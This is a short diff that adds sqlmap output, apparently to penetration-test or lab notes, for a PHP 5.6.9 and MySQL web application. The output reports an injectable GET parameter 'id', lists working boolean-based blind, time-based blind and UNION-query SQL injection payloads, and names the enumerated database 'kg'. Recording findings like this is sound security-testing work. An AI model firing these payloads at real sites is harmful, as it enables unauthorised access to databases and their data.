@@ -38,3 +38,23 @@ back-end DBMS: MySQL <= 5.0.11
 available databases [1]:
 [*] kg
 
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6659=6659
+
+    Type: AND/OR time-based blind
+    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+    Payload: id=1 AND 4693=BENCHMARK(5000000,MD5(0x5774706c))
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-1884 UNION ALL SELECT CONCAT(0x716b626271,0x454d455a434e53576b6d726a6d4d65464e685078515976414e686c434c5372744a79544567644f56,0x7171716a71),NULL-- knRL
+---
+web application technology: PHP 5.6.9
+back-end DBMS: MySQL <= 5.0.11
+available databases [1]:
+[*] kg
+
